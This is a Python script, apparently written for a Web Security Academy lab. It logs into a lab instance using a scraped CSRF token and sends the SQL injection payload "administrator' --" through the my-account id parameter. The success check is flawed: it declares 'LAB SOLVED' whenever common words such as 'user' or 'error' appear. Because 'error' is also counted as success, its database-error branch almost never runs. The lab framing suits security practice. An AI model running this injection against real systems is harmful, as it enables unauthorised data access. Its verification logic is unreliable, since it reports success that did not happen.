import requests
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

def run_lab():
    # URL for login and vulnerable point (replace domain if needed)
    login_url = "https://0a5d00b9040b419a836a4767000300d0.web-security-academy.net/login"
    # URL for vulnerable point (taken from your screenshot)
    vulnerable_url_base = "https://0a5d00b9040b419a836a4767000300d0.web-security-academy.net/my-account?id="

    # Login credentials (replace with actual values for your lab)
    username = "YOUR_PORTSWIGGER_USERNAME"
    password = "YOUR_PORTSWIGGER_PASSWORD"

    session = requests.Session()

    # Retry strategy setup for timeouts
    retry_strategy = Retry(
        total=3,
        backoff_factor=2,
        status_forcelist=[429, 502, 503, 504],
        allowed_methods=["GET", "POST"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("https://", adapter)

    try:
        # Step 1: Get login page and parse CSRF token
        resp = session.get(login_url, timeout=30)
        resp.raise_for_status()
        soup = BeautifulSoup(resp.text, "html.parser")
        csrf_input = soup.find("input", {"name": "csrf"})

        if not csrf_input or "value" not in csrf_input.attrs:
            raise RuntimeError("Failed to find CSRF token.")

        csrf_token = csrf_input["value"]
        print(f"CSRF token: {csrf_token}")

        # Step 2: Perform POST request to login
        payload = {
            "csrf": csrf_token,
            "username": username,
            "password": password
        }
        login_resp = session.post(login_url, data=payload, timeout=30)
        login_resp.raise_for_status()

        print(f"Login status: {login_resp.status_code}")
        print(f"Login URL: {login_resp.url}")

        # Check redirect (successful login)
        if login_resp.history:
            print("✅ Login successful (redirect occurred).")
        else:
            print("⚠️ Login without redirect — check username/password.")

    except Exception as e:
        print(f"❌ Login error: {e}")
        return

    # Step 3: Test SQL Injection
    print("\n--- STARTING SQL INJECTION TEST ---")

    # Classic payload to check vulnerability
    test_payload = "administrator' --"
    test_url = vulnerable_url_base + test_payload

    try:
        injection_resp = session.get(test_url, timeout=30)
        injection_resp.raise_for_status()

        # Analyze response
        response_text = injection_resp.text.lower()

        # Keywords indicating successful data leak
        success_keywords = ["administrator", "password", "email", "user", "database", "error"]
        error_keywords = ["error", "syntax", "sql", "exception"]

        if any(keyword in response_text for keyword in success_keywords):
            print("✅ LAB SOLVED! Data leak detected (SQL injection worked).")
            print("Response details: Keywords indicating data access found in the text.")
        elif any(keyword in response_text for keyword in error_keywords):
            print("❌ ERROR: The query caused a database error.")
            print("Try another attack vector (e.g., without '--' comments or with UNION).")
        else:
            print("⚠️ UNCERTAIN: Response received, but no clear signs of data leak found.")
            print("Check if the URL and injection parameter are correct.")

    except requests.exceptions.HTTPError as e:
        print(f"❌ HTTP error during injection: {e}")
    except Exception as e:
        print(f"❌ Error during injection: {e}")


if __name__ == "__main__":
    run_lab()
